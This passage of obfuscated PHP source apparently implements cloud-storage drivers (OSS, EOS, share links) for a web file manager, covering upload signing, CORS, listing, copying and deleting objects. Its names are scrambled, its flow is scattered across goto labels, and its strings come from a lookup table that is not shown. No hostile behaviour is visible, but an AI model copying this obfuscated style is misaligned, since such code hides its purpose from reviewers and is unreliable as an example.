array($B’¼§öÙ…‹[736] => $FàÕ„ùª´, $B’¼§öÙ…‹[733] => 1, $B’¼§öÙ…‹[750] => $D°»Ïƒ±í, $B’¼§öÙ…‹[751] => $f©ÊåŸ¢¾„, $B’¼§öÙ…‹[752] => time()); goto C­ÜÉî©Á; d¢§™¾´ãÉ: } private function _dbType($a…ÁĞ¤êÆæ) { goto d˜Ù¯Ş›¹; d˜Ù¯Ş›¹: $Bµ—Ÿá¼–Ø =& $_SERVER[´¬]; $a…ÁĞ¤êÆæ = array_change_key_case($a…ÁĞ¤êÆæ); $EÙ—Â¹áá÷ = $a…ÁĞ¤êÆæ[$Bµ—Ÿá¼–Ø[754]]; goto b ›Û¬ª£; aŞƒË±: return $EÙ—Â¹áá÷; goto dç«êëŸ­; b ›Û¬ª£: if ($EÙ—Â¹áá÷ == $Bµ—Ÿá¼–Ø[755]) { $b©óİ¹Ø‚‚ = explode($Bµ—Ÿá¼–Ø[4], $a…ÁĞ¤êÆæ[$Bµ—Ÿá¼–Ø[756]]); $EÙ—Â¹áá÷ = $b©óİ¹Ø‚‚[0]; } $c´İåÂÃœÄ = array($Bµ—Ÿá¼–Ø[757] => $Bµ—Ÿá¼–Ø[9], $Bµ—Ÿá¼–Ø[758] => $Bµ—Ÿá¼–Ø[759]); if (isset($c´İåÂÃœÄ[$EÙ—Â¹áá÷])) { $EÙ—Â¹áá÷ = $c´İåÂÃœÄ[$EÙ—Â¹áá÷]; } goto aŞƒË±; dç«êëŸ­: } private function tmpFilesPath() { $D‘äù¤Œ›¢ =& $_SERVER[´¬]; $Aã‰ãîã…Š = TEMP_FILES; if ($GLOBALS[$D‘äù¤Œ›¢[6]][$D‘äù¤Œ›¢[88]][$D‘äù¤Œ›¢[760]]) { $Aã‰ãîã…Š = $GLOBALS[$D‘äù¤Œ›¢[6]][$D‘äù¤Œ›¢[88]][$D‘äù¤Œ›¢[760]]; if (!mk_dir($Aã‰ãîã…Š) || !is_writable($Aã‰ãîã…Š) || !IO::mkfile($Aã‰ãîã…Š . $D‘äù¤Œ›¢[761])) { $Aã‰ãîã…Š = TEMP_FILES; } } return $Aã‰ãîã…Š; } } goto e‡”Üùµ”µ; A £ìñÇˆ¦: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($C„”ï›º’) { $this->pathParse = $C„”ï›º’; } protected function infoParse($c’Æ×Œ†ø­, $AØõ¿È„ÚÑ = false) { $bÇŞâÖª°á =& $_SERVER[´¬]; return Action($bÇŞâÖª°á[1071])->sharePathInfo($this->pathParse[$bÇŞâÖª°á[76]], !0, $AØõ¿È„ÚÑ); } public function listPath($c‘ÇƒäµÎ, $DÄØ«‡Æ‡¹ = false) { $eÀ°¹Ã‹Ñ =& $_SERVER[´¬]; $bİºÂàĞß = IO::listPath($c‘ÇƒäµÎ, $DÄØ«‡Æ‡¹); foreach ($bİºÂàĞß as $D‡ßÇÊ–¤Ü => $EŠùêÕÇ„†) { if (!in_array($D‡ßÇÊ–¤Ü, array($eÀ°¹Ã‹Ñ[74], $eÀ°¹Ã‹Ñ[75]))) { continue; } foreach ($EŠùêÕÇ„† as $b®³½ø‰öƒ => $E£íÏŞà°) { $E£íÏŞà° = Action($eÀ°¹Ã‹Ñ[1223])->parsePathChildren($E£íÏŞà°, array($eÀ°¹Ã‹Ñ[412] => $c‘ÇƒäµÎ)); $bİºÂàĞß[$D‡ßÇÊ–¤Ü][$b®³½ø‰öƒ] = Action($eÀ°¹Ã‹Ñ[1071])->shareItemInfo($E£íÏŞà°); } } return $bİºÂàĞß; } public function listAll($d­…ÇĞÉ­Â) { $b´Ô¨êİ… =& $_SERVER[´¬]; $f’‚ÓŞ…¨Œ = IO::listAll($d­…ÇĞÉ­Â); foreach ($f’‚ÓŞ…¨Œ as &$Fò©…‹æ¸„) { $d“¼íâ¹— = IO::info($Fò©…‹æ¸„[$b´Ô¨êİ…[76]]); $d“¼íâ¹— = is_array($d“¼íâ¹—) ? $d“¼íâ¹— : array(); $Fò©…‹æ¸„ = array_merge($d“¼íâ¹—, $Fò©…‹æ¸„); $Fò©…‹æ¸„[$b´Ô¨êİ…[85]] = Action($b´Ô¨êİ…[1071])->shareItemInfo($Fò©…‹æ¸„); } unset($Fò©…‹æ¸„); return $f’‚ÓŞ…¨Œ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($AŞÕµÈõ) { parent::__construct($AŞÕµÈõ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($FŠèäØÒ¤) { parent::__construct($FŠèäØÒ¤); $this->signatureVersion($_SERVER[´¬][211]); } public function uploadFormData($fÔ¡£ Œª, $fÔÅ‰‡Ú÷ø = 3600) { goto d×¼Í¹¡©; aöƒ¸ÀØ¦: $E¼ÎœƒñÖŠ = $d‚²‘àì‡®[59]; $c³Á›çÜù = gmdate($d‚²‘àì‡®[1225]); $Bí†Ó‘´ = gmdate($d‚²‘àì‡®[714]); goto FÈ’ªñ¨·; d¾±Ë™±´: $dñÚ¸»ƒÔ¸ = hash_hmac($d‚²‘àì‡®[1234], $E¼ÎœƒñÖŠ, $d¤’¨…ÜÛ°, !0); $DŠ¶¥çÇ– = hash_hmac($d‚²‘àì‡®[1234], $Cğ”·º—Ä¯, $dñÚ¸»ƒÔ¸, !0); $aìÖ«ÙˆÂŠ = hash_hmac($d‚²‘àì‡®[1234], $D»İø“Ê–, $DŠ¶¥çÇ–); goto C³öííã²Û; C³öííã²Û: $aˆ´ÜÇ¦š¨ = array($d‚²‘àì‡®[210] => $d‚²‘àì‡®[33], $d‚²‘àì‡®[1236] => $d‚²‘àì‡®[33], $d‚²‘àì‡®[1193] => $eùÊéˆœÕ†, $d‚²‘àì‡®[1197] => $Cø¬ÂÚÑÖ, $d‚²‘àì‡®[1201] => $D»İø“Ê–, $d‚²‘àì‡®[1237] => $BïĞëÄš½É, $d‚²‘àì‡®[1238] => $dÊ˜ØÎŒÍÏ, $d‚²‘àì‡®[1239] => $c³Á›çÜù, $d‚²‘àì‡®[1240] => $dËÙİÈëíĞ, $d‚²‘àì‡®[1241] => $aìÖ«ÙˆÂŠ, $d‚²‘àì‡®[175] => $this->getHost()); return $aˆ´ÜÇ¦š¨; goto BµĞØöõå; FÈ’ªñ¨·: $Cğ”·º—Ä¯ = $d‚²‘àì‡®[1226]; $dËÙİÈëíĞ = $fÔÅ‰‡Ú÷ø . $d‚²‘àì‡®[33]; $Cø¬ÂÚÑÖ = $d‚²‘àì‡®[1189]; goto e‘ïôà„åŞ; e‘ïôà„åŞ: $cÃÃÜõ–Ò = array($this->accessKey, $Bí†Ó‘´, $this->region, $E¼ÎœƒñÖŠ, $Cğ”·º—Ä¯); $BïĞëÄš½É = implode($d‚²‘àì‡®[8], $cÃÃÜõ–Ò); $f¼„õÖ£ˆÌ = array($d‚²‘àì‡®[1191] => gmdate($d‚²‘àì‡®[1190], strtotime($d‚²‘àì‡®[1227])), $d‚²‘àì‡®[1192] => array(array($d‚²‘àì‡®[1194] => $this->bucket), array($d‚²‘àì‡®[1193] => $eùÊéˆœÕ†), array($d‚²‘àì‡®[1195], $d‚²‘àì‡®[1196], $d‚²‘àì‡®[33]), array($d‚²‘àì‡®[1195], $d‚²‘àì‡®[1228], $d‚²‘àì‡®[33]), array($d‚²‘àì‡®[1195], $d‚²‘àì‡®[1229], $d‚²‘àì‡®[33]), array($d‚²‘àì‡®[1197] => $Cø¬ÂÚÑÖ), array($d‚²‘àì‡®[1230] => $BïĞëÄš½É), array($d‚²‘àì‡®[1231] => $dÊ˜ØÎŒÍÏ), array($d‚²‘àì‡®[1232] => $c³Á›çÜù), array($d‚²‘àì‡®[1233] => $dËÙİÈëíĞ))); goto AÈàö­òö; d×¼Í¹¡©: $d‚²‘àì‡® =& $_SERVER[´¬]; $eùÊéˆœÕ† = $d‚²‘àì‡®[191]; $dÊ˜ØÎŒÍÏ = $d‚²‘àì‡®[1224]; goto aöƒ¸ÀØ¦; AÈàö­òö: $D»İø“Ê– = base64_encode(json_encode($f¼„õÖ£ˆÌ)); $fïö¸ô¨ß = hash_hmac($d‚²‘àì‡®[1234], $Bí†Ó‘´, $d‚²‘àì‡®[1235] . $this->secret, !0); $d¤’¨…ÜÛ° = hash_hmac($d‚²‘àì‡®[1234], $this->region, $fïö¸ô¨ß, !0); goto d¾±Ë™±´; BµĞØöõå: } } goto BîÖ¢ª‘‘Ú; b‹Êé¡äÁ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($bãàé¥‘™Ã) { parent::__construct($bãàé¥‘™Ã); $this->signatureVersion($_SERVER[´¬][211]); } public function fileOutLink($b¯£çˆÍÙ³) { $Dì‚ÍÛÛ— =& $_SERVER[´¬]; if (substr($b¯£çˆÍÙ³, 0, 7) == $Dì‚ÍÛÛ—[1204]) { $b¯£çˆÍÙ³ = $Dì‚ÍÛÛ—[1205] . substr($b¯£çˆÍÙ³, 7); } header($Dì‚ÍÛÛ—[159] . $b¯£çˆÍÙ³); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($A¢ø¬°‹•Ğ) { parent::__construct(); include_once SDK_DIR . $_SERVER[´¬][1260]; $this->_init($A¢ø¬°‹•Ğ); } public function _init($d×ÁßóàÖ) { $AÂ¥í¼ôÏ” =& $_SERVER[´¬]; foreach ($d×ÁßóàÖ as $bê‡Ô²Ö¢ù => $B®¸µ¯¸Ï) { if (isset($this->{$bê‡Ô²Ö¢ù})) { $this->{$bê‡Ô²Ö¢ù} = $B®¸µ¯¸Ï; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($AÂ¥í¼ôÏ”[1261] . LNG($AÂ¥í¼ôÏ”[1262])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto Dšƒ°¦Áã£; Dšƒ°¦Áã£: $cÉÙà­¦‡ =& $_SERVER[´¬]; $AÁÖÊœ¼æ = new OSS\Model\CorsConfig(); $f©ÄÑˆ—Àí = new OSS\Model\CorsRule(); goto c™É‹»³¿Š; c™É‹»³¿Š: $f©ÄÑˆ—Àí->addAllowedOrigin($cÉÙà­¦‡[1263]); $f©ÄÑˆ—Àí->addAllowedMethod($cÉÙà­¦‡[1264]); $f©ÄÑˆ—Àí->addAllowedMethod($cÉÙà­¦‡[1265]); goto d°Åäº×; Eâ¿ò’¡ø¡: $AÁÖÊœ¼æ->addRule($f©ÄÑˆ—Àí); try { $this->client->putBucketCors($this->bucket, $AÁÖÊœ¼æ); } catch (OSS\Core\OssException $bÇÈÊæŞ‘õ) { return !1; } return !0; goto c­ÊÛå«Â; EÚ„Ÿîãë¸: $f©ÄÑˆ—Àí->setMaxAgeSeconds(600); $f©ÄÑˆ—Àí->addExposeHeader($cÉÙà­¦‡[1268]); $f©ÄÑˆ—Àí->addAllowedHeader($cÉÙà­¦‡[1263]); goto Eâ¿ò’¡ø¡; d°Åäº×: $f©ÄÑˆ—Àí->addAllowedMethod($cÉÙà­¦‡[1266]); $f©ÄÑˆ—Àí->addAllowedMethod($cÉÙà­¦‡[1267]); $f©ÄÑˆ—Àí->addAllowedMethod($cÉÙà­¦‡[158]); goto EÚ„Ÿîãë¸; c­ÊÛå«Â: } public function getBucketCors() { goto eò¥°ƒö—; eò¥°ƒö—: $f‹óêø¯î— =& $_SERVER[´¬]; $fêÁÃßø‘› = null; try { $fêÁÃßø‘› = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $fŠ­ÑˆÒˆ) { return null; } goto F¸«§õùÎÔ; C§ó¨¼‘¥: return array($f‹óêø¯î—[181] => isset($A×œùË¾Ğ‡[0]) ? $A×œùË¾Ğ‡[0] : $f‹óêø¯î—[33], $f‹óêø¯î—[185] => $dØ˜ÍŒ¥¥, $f‹óêø¯î—[1269] => $E››£Œßôï, $f‹óêø¯î—[1270] => isset($BöÁÍ¶Úìª[0]) ? $BöÁÍ¶Úìª[0] : $f‹óêø¯î—[33], $f‹óêø¯î—[183] => isset($b°Ÿ›¹‚•[0]) ? $b°Ÿ›¹‚•[0] : $f‹óêø¯î—[33]); goto EÑ‡İ®Ÿä´; FÂå¥—¸ÁË: $E››£Œßôï = $c–æ¯–£é¯[0]->getMaxAgeSeconds(); $BöÁÍ¶Úìª = $c–æ¯–£é¯[0]->getExposeHeaders(); $b°Ÿ›¹‚• = $c–æ¯–£é¯[0]->getAllowedHeaders(); goto C§ó¨¼‘¥; F¸«§õùÎÔ: if (!$fêÁÃßø‘› || !($c–æ¯–£é¯ = $fêÁÃßø‘›->getRules())) { return null; } $A×œùË¾Ğ‡ = $c–æ¯–£é¯[0]->getAllowedOrigins(); $dØ˜ÍŒ¥¥ = $c–æ¯–£é¯[0]->getAllowedMethods(); goto FÂå¥—¸ÁË; EÑ‡İ®Ÿä´: } public function isBucketCors() { goto AÊÀâ·œŸ‚; AÁ’„Å½ã: $e®¢¢êÖ‘• = array($EÓä”´‰‹[186], $EÓä”´‰‹[187], $EÓä”´‰‹[188], $EÓä”´‰‹[189], $EÓä”´‰‹[190]); $Aš– Å°†ç = array_diff($e®¢¢êÖ‘•, $EÓç¤¦êš´); return empty($Aš– Å°†ç); goto DÀÌÍĞÎ; BÑŒÕôŸ: if ($AÓ„Õ÷¦‰ø[$EÓä”´‰‹[181]] != $EÓä”´‰‹[182] || $AÓ„Õ÷¦‰ø[$EÓä”´‰‹[183]] != $EÓä”´‰‹[182]) { return !1; } $EÓç¤¦êš´ = array_map($EÓä”´‰‹[184], $AÓ„Õ÷¦‰ø[$EÓä”´‰‹[185]]); if (!is_array($EÓç¤¦êš´)) { $EÓç¤¦êš´ = array(); } goto AÁ’„Å½ã; AÊÀâ·œŸ‚: $EÓä”´‰‹ =& $_SERVER[´¬]; $AÓ„Õ÷¦‰ø = $this->getBucketCors(); if (!$AÓ„Õ÷¦‰ø || !is_array($AÓ„Õ÷¦‰ø)) { return !1; } goto BÑŒÕôŸ; DÀÌÍĞÎ: } public function mkfile($aâ¸Àˆ‰™è, $FÏ¤ÛÑÚª = '', $f·²Õá£ë = REPEAT_RENAME) { $d¹Ñ®â¤’È = $this->setContent($aâ¸Àˆ‰™è, $FÏ¤ÛÑÚª); if ($d¹Ñ®â¤’È !== !1) { return $this->getPathOuter($aâ¸Àˆ‰™è); } return !1; } public function mkdir($B‡Û´’”­§, $AÚî’•Ş· = REPEAT_SKIP) { if ($this->_isFolder($B‡Û´’”­§)) { return $this->getPathOuter($B‡Û´’”­§); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($B‡Û´’”­§)); } catch (OSS\Core\OssException $dä·íğßç‰) { return !1; } return $this->getPathOuter($B‡Û´’”­§); } private function fileList($aëÇñœœé, $C÷Ÿ»Ø—™ = '', $fÈ¬ƒ×Ñ¼ˆ = 0) { goto C­‡¨ÎŞĞ©; aÉ¿Õ¯œ‡: $e‰®éò©ˆî = $B–ç×Ìä‚[33]; $cÀÉ´å® = 1000; $E–¦‚Íá­ = $this->listItemCache === !1 ? !1 : !0; goto fÄ¹ù‘âğÔ; C­‡¨ÎŞĞ©: $B–ç×Ìä‚ =& $_SERVER[´¬]; $aëÇñœœé = trim($aëÇñœœé, $B–ç×Ìä‚[8]); $C‰ó©õ‘Ò = empty($aëÇñœœé) ? $B–ç×Ìä‚[33] : $aëÇñœœé . $B–ç×Ìä‚[8]; goto aÉ¿Õ¯œ‡; d™‚¬åîÅŸ: return array($B–ç×Ìä‚[75] => $b”ÃºÙ˜Óá, $B–ç×Ìä‚[74] => $dÈº®•…åé); goto E¶ÜÜàÈñ¸; fÄ¹ù‘âğÔ: $b”ÃºÙ˜Óá = $dÈº®•…åé = array(); while (!0) { check_abort(); $eº¹¶»«´À = array($B–ç×Ìä‚[1271] => $C÷Ÿ»Ø—™, $B–ç×Ìä‚[1272] => $C‰ó©õ‘Ò, $B–ç×Ìä‚[1273] => $cÀÉ´å®, $B–ç×Ìä‚[1274] => $e‰®éò©ˆî); try { $Eœƒ…äÎè = $this->client->listObjects($this->bucket, $eº¹¶»«´À); } catch (OSS\Core\OssException $B›Š˜â¿œÚ) { break; } $e‰®éò©ˆî = $Eœƒ…äÎè->getNextMarker(); $a…Ö®ÌÇöõ = $Eœƒ…äÎè->getObjectList(); $e«„å²êèô = $Eœƒ…äÎè->getPrefixList(); foreach ($a…Ö®ÌÇöõ as $FÖ´²­™¿©) { goto d¡Óñ’‡…; d¡Óñ’‡…: if ($FÖ´²­™¿©->getKey() == $C‰ó©õ‘Ò) { continue; } $DÍ¶ÂÏ”Şƒ = $FÖ´²­™¿©->getKey(); $E•ŠÚíÑÙ = $FÖ´²­™¿©->getSize(); goto a‡ğ±Õİ–Ì; a‡ğ±Õİ–Ì: $d¢Î»ÈÈ„Â = $FÖ´²­™¿©->getLastModified(); $Cø—ÁØ×’© = $fÈ¬ƒ×Ñ¼ˆ ? array($B–ç×Ìä‚[28] => $DÍ¶ÂÏ”Şƒ, $B–ç×Ìä‚[78] => $E•ŠÚíÑÙ, $B–ç×Ìä‚[196] => strtotime($d¢Î»ÈÈ„Â)) : $DÍ¶ÂÏ”Şƒ; $Béœ·¯šÈ = $E•ŠÚíÑÙ == 0 && substr($DÍ¶ÂÏ”Şƒ, strlen($DÍ¶ÂÏ”Şƒ) - 1, 1) == $B–ç×Ìä‚[8] ? !0 : !1; goto CÛŒæã’ôï; CÛŒæã’ôï: if ($E–¦‚Íá­) { $this->cacheMethod($B–ç×Ìä‚[198], $DÍ¶ÂÏ”Şƒ, $Béœ·¯šÈ); $this->cacheMethod($B–ç×Ìä‚[199], $DÍ¶ÂÏ”Şƒ, array($B–ç×Ìä‚[78] => $E•ŠÚíÑÙ, $B–ç×Ìä‚[1275] => $E•ŠÚíÑÙ, $B–ç×Ìä‚[84] => strtotime($d¢Î»ÈÈ„Â), $B–ç×Ìä‚[1276] => $d¢Î»ÈÈ„Â)); } if ($Béœ·¯šÈ) { $b”ÃºÙ˜Óá[] = $DÍ¶ÂÏ”Şƒ; continue; } $dÈº®•…åé[] = $Cø—ÁØ×’©; goto f¶Ïğ—Ù¢ñ; f¶Ïğ—Ù¢ñ: } foreach ($e«„å²êèô as $dÉ‡°Ÿ¥º) { $b”ÃºÙ˜Óá[] = $dÉ‡°Ÿ¥º->getPrefix(); if ($E–¦‚Íá­) { $this->cacheMethod($B–ç×Ìä‚[198], $DÍ¶ÂÏ”Şƒ, !0); } } if ($e‰®éò©ˆî === $B–ç×Ìä‚[33]) { break; } } if ($E–¦‚Íá­) { $this->cacheMethod($B–ç×Ìä‚[198], $aëÇñœœé, !0); } goto d™‚¬åîÅŸ; E¶ÜÜàÈñ¸: } public function copyFile($eéÉˆØ, $FĞÄ¼×ÓÅÃ) { $d•„ŠÚ … = $this->size($eéÉˆØ); if ($d•„ŠÚ … < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $eéÉˆØ, $this->bucket, $this->pathEncode($FĞÄ¼×ÓÅÃ)); } catch (OSS\Core\OssException $C¥†„ß¹Ê) { return !1; } return $this->getPathOuter($FĞÄ¼×ÓÅÃ); } $eëˆ«Öó° = $this->multiCopyObject($eéÉˆØ, $FĞÄ¼×ÓÅÃ, $d•„ŠÚ …); return $eëˆ«Öó° ? $this->getPathOuter($FĞÄ¼×ÓÅÃ) : !1; } private function multiCopyObject($cÑÀĞĞ­Ê¤, $f÷ËÏ£Õ†æ, $FÜ‹óğÌ‰) { $F¼¯‘ŠÉ¡Ç =& $_SERVER[´¬]; try { goto b¬ÀÊˆïßÕ; b¬ÀÊˆïßÕ: $Dï¾ğÄŠõò = array(); if ($aˆéí¾ã = $this->hashMd5($cÑÀĞĞ­Ê¤)) { $Dï¾ğÄŠõò = array(OSS\OssClient::OSS_HEADERS => array($F¼¯‘ŠÉ¡Ç[1277] => $aˆéí¾ã)); } $FÍ²Ÿİ† = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($f÷ËÏ£Õ†æ), $Dï¾ğÄŠõò); goto dòÖ©á¥‹Ò; EĞ§ßŠÓí: $aÇÒ×¶”· = array(); foreach ($f…Çõ‡‹’² as $e÷Ùœ§ËŒÙ => $c‚îà÷ ¥) { $aÇÒ×¶”·[] = array($F¼¯‘ŠÉ¡Ç[1281] => $e÷Ùœ§ËŒÙ + 1, $F¼¯‘ŠÉ¡Ç[1282] => $c‚îà÷ ¥); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($f÷ËÏ£Õ†æ), $FÍ²Ÿİ†, $aÇÒ×¶”·); goto cìğìÍÅ‰´; EÜœ…¥¿ô: $cÖáñÛòâë = 1024 * 1024 * 10; $BÂÅ©ôõİˆ = $this->client->generateMultiuploadParts($FÜ‹óğÌ‰, $cÖáñÛòâë); foreach ($BÂÅ©ôõİˆ as $e÷Ùœ§ËŒÙ => $A•…Š¥®Æ) { $d®ŞèÇ÷”Ò = $D‹Šƒíô®‰ + (int) $A•…Š¥®Æ[$F¼¯‘ŠÉ¡Ç[1278]]; $Dî¿±î­Ëá = (int) $A•…Š¥®Æ[$F¼¯‘ŠÉ¡Ç[334]] + $d®ŞèÇ÷”Ò - 1; $F™¥‡³óä = array($F¼¯‘ŠÉ¡Ç[1279] => $d®ŞèÇ÷”Ò, $F¼¯‘ŠÉ¡Ç[1280] => $Dî¿±î­Ëá); $f…Çõ‡‹’²[] = $this->client->uploadPartCopy($this->bucket, $cÑÀĞĞ­Ê¤, $this->bucket, $this->pathEncode($f÷ËÏ£Õ†æ), $b“åõˆ™–, $FÍ²Ÿİ†, $F™¥‡³óä); $b“åõˆ™– = $b“åõˆ™– + 1; } goto EĞ§ßŠÓí; dòÖ©á¥‹Ò: $b“åõˆ™– = 1; $D‹Šƒíô®‰ = 0; $f…Çõ‡‹’² = array(); goto EÜœ…¥¿ô; cìğìÍÅ‰´: } catch (OSS\Core\OssException $E«ì”øº à) { return !1; } return !0; } public function moveFile($DäŠÌÓÒÑ¿, $eòº„‹…ãÛ) { if ($this->copyFile($DäŠÌÓÒÑ¿, $eòº„‹…ãÛ)) { $this->remove($DäŠÌÓÒÑ¿); return $this->getPathOuter($eòº„‹…ãÛ); } return !1; } public function delFile($FîîÉ£È‚ˆ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($FîîÉ£È‚ˆ)); } catch (OSS\Core\OssException $F¹îæ¡Ó†÷) { return !1; } return !0; } public function delFolder($fŠ‘£•Ÿôƒ) { goto aÇŒ¦Üè—³; A‹î‡äè¤Î: return $this->delByBatch($EÑ‚©â»[$eÊå¶™Í¶ä[75]]); goto B¨¥®²å†Ş; F¯¼È“Ëì: if (!empty($fŠ‘£•Ÿôƒ) && !in_array($eÚ—¨‰é«¾, $EÑ‚©â»[$eÊå¶™Í¶ä[75]])) { $EÑ‚©â»[$eÊå¶™Í¶ä[75]][] = $eÚ—¨‰é«¾; } $a‹×™šÏÄÈ = $this->delByBatch($EÑ‚©â»[$eÊå¶™Í¶ä[74]]); if (!$a‹×™šÏÄÈ) { return !1; } goto A‹î‡äè¤Î; aÇŒ¦Üè—³: $eÊå¶™Í¶ä =& $_SERVER[´¬]; if (!$this->exist($fŠ‘£•Ÿôƒ)) { return !0; } $this->listItemCache = !1; goto bâ…Ãç‘¼õ; bâ…Ãç‘¼õ: $EÑ‚©â» = $this->fileList($fŠ‘£•Ÿôƒ); $this->listItemCache = !0; $eÚ—¨‰é«¾ = trim($fŠ‘£•Ÿôƒ, $eÊå¶™Í¶ä[8]) . $eÊå¶™Í¶ä[8]; goto F¯¼È“Ëì; B¨¥®²å†Ş: } private function delByBatch($cà¯Îòš‰“) { foreach (array_chunk($cà¯Îòš‰“, 1000) as $E‚‹’«¾) { try { $this->client->deleteObjects($this->bucket, $E‚‹’«¾); } catch (OSS\Core\OssException $c„·Â¢§¢) { return !1; } } return !0; } public function rename($EÃ˜Ä¸ØÁ, $AÎøªì»õ) { return $this->renameObject($EÃ˜Ä¸ØÁ, $AÎøªì»õ); } private function fileInfo($B×ãÁÂÈÉö, $BáÁæ“¨¼ = false, $AËğ—‘îÑó = array()) { goto B‘è¹—²ƒ©; c¸æ¸‹²áö: if (isset($AËğ—‘îÑó[$FÊÄ©³å×¬[78]])) { $C¯æŠ¡ˆ¬[$FÊÄ©³å×¬[78]] = $AËğ—‘îÑó[$FÊÄ©³å×¬[78]]; } if (isset($AËğ—‘îÑó[$FÊÄ©³å×¬[84]])) { $C¯æŠ¡ˆ¬[$FÊÄ©³å×¬[84]] = $AËğ—‘îÑó[$FÊÄ©³å×¬[84]]; } if (isset($AËğ—‘îÑó[$FÊÄ©³å×¬[196]]) && !trim($C¯æŠ¡ˆ¬[$FÊÄ©³å×¬[84]])) { $C¯æŠ¡ˆ¬[$FÊÄ©³å×¬[84]] = $AËğ—‘îÑó[$FÊÄ©³å×¬[196]]; } goto Dµ—·Ñàç¼; B‘è¹—²ƒ©: $FÊÄ©³å×¬ =& $_SERVER[´¬]; $C¯æŠ¡ˆ¬ = array($FÊÄ©³å×¬[28] => $this->pathThis($B×ãÁÂÈÉö), $FÊÄ©³å×¬[76] => $this->getPathOuter($B×ãÁÂÈÉö), $FÊÄ©³å×¬[29] => $FÊÄ©³å×¬[192], $FÊÄ©³å×¬[78] => isset($AËğ—‘îÑó[$FÊÄ©³å×¬[78]]) ? $AËğ—‘îÑó[$FÊÄ©³å×¬[78]] : 0, $FÊÄ©³å×¬[168] => $this->ext($B×ãÁÂÈÉö)); if ($BáÁæ“¨¼) { return $C¯æŠ¡ˆ¬; } goto b¨¦Æ¤³Ç; Dµ—·Ñàç¼: return $C¯æŠ¡ˆ¬; goto dğ¹°®Õ‹Ï; b¨¦Æ¤³Ç: $C¯æŠ¡ˆ¬[$FÊÄ©³å×¬[193]] = $C¯æŠ¡ˆ¬[$FÊÄ©³å×¬[84]] = 0; $C¯æŠ¡ˆ¬[$FÊÄ©³å×¬[194]] = $C¯æŠ¡ˆ¬[$FÊÄ©³å×¬[195]] = !0; if (empty($AËğ—‘îÑó)) { $Dó­áÆÙ×Â = $this->objectMeta($B×ãÁÂÈÉö); if (!$Dó­áÆÙ×Â) { return $C¯æŠ¡ˆ¬; } $AËğ—‘îÑó = array($FÊÄ©³å×¬[84] => strtotime($Dó­áÆÙ×Â[$FÊÄ©³å×¬[1276]]), $FÊÄ©³å×¬[78] => $Dó­áÆÙ×Â[$FÊÄ©³å×¬[1275]] + 0); } goto c¸æ¸‹²áö; dğ¹°®Õ‹Ï: } private function folderInfo($e„Ñ£ÕÀ˜ñ, $c«†éó×ô = false, $F„µ²ªß¡ = array()) { goto c±Àñœ¶Ş‡; c±Àñœ¶Ş‡: $Cø†òÑ…Ø =& $_SERVER[´¬]; $dÉ¬Ã¼¢œ = array($Cø†òÑ…Ø[28] => $this->pathThis($e„Ñ£ÕÀ˜ñ), $Cø†òÑ…Ø[76] => $this->getPathOuter($Cø†òÑ…Ø[8] . $e„Ñ£ÕÀ˜ñ), $Cø†òÑ…Ø[29] => $Cø†òÑ…Ø[77]); if ($c«†éó×ô) { return $dÉ¬Ã¼¢œ; } goto fÔÌŒÌ¸˜; f¨â¿ÍùÊ: if (isset($F„µ²ªß¡[$Cø†òÑ…Ø[84]])) { $dÉ¬Ã¼¢œ[$Cø†òÑ…Ø[84]] = $F„µ²ªß¡[$Cø†òÑ…Ø[84]]; } if (isset($F„µ²ªß¡[$Cø†òÑ…Ø[193]])) { $dÉ¬Ã¼¢œ[$Cø†òÑ…Ø[193]] = $F„µ²ªß¡[$Cø†òÑ…Ø[193]]; } return $dÉ¬Ã¼¢œ; goto cÂ…ÙƒÊ§‚; fÔÌŒÌ¸˜: $dÉ¬Ã¼¢œ[$Cø†òÑ…Ø[193]] = $dÉ¬Ã¼¢œ[$Cø†òÑ…Ø[84]] = 0; $dÉ¬Ã¼¢œ[$Cø†òÑ…Ø[194]] = $dÉ¬Ã¼¢œ[$Cø†òÑ…Ø[195]] = !0; if (empty($F„µ²ªß¡)) { $e„Ñ£ÕÀ˜ñ = rtrim($e„Ñ£ÕÀ˜ñ, $Cø†òÑ…Ø[8]) . $Cø†òÑ…Ø[8]; $B‘†ÊÇáæ = $this->objectMeta($e„Ñ£ÕÀ˜ñ); if (!$B‘†ÊÇáæ) { return $dÉ¬Ã¼¢œ; } $F„µ²ªß¡ = array($Cø†òÑ…Ø[193] => $B‘†ÊÇáæ[$Cø†òÑ…Ø[1283]][$Cø†òÑ…Ø[1284]], $Cø†òÑ…Ø[84] => strtotime($B‘†ÊÇáæ[$Cø†òÑ…Ø[1276]])); } goto f¨â¿ÍùÊ; cÂ…ÙƒÊ§‚: } public function listPath($C“Ø“»åö, $AÇ–“ÕÖµ‡ = false) { $FÂ–ÚË»¤ =& $_SERVER[´¬]; $càí²¾äâ© = $this->fileList($C“Ø“»åö, $FÂ–ÚË»¤[8], !0); foreach ($càí²¾äâ©[$FÂ–ÚË»¤[75]] as $fâµ¹òÌé => $eŠ²…¢İÜ‘) { $càí²¾äâ©[$FÂ–ÚË»¤[75]][$fâµ¹òÌé] = $this->folderInfo($eŠ²…¢İÜ‘, $AÇ–“ÕÖµ‡, $eŠ²…¢İÜ‘); } foreach ($càí²¾äâ©[$FÂ–ÚË»¤[74]] as $fâµ¹òÌé => $eŠ²…¢İÜ‘) { $càí²¾äâ©[$FÂ–ÚË»¤[74]][$fâµ¹òÌé] = $this->fileInfo($eŠ²…¢İÜ‘[$FÂ–ÚË»¤[28]], $AÇ–“ÕÖµ‡, $eŠ²…¢İÜ‘); } return $càí²¾äâ©; } public function has($aö‹Ò†ä ˆ, 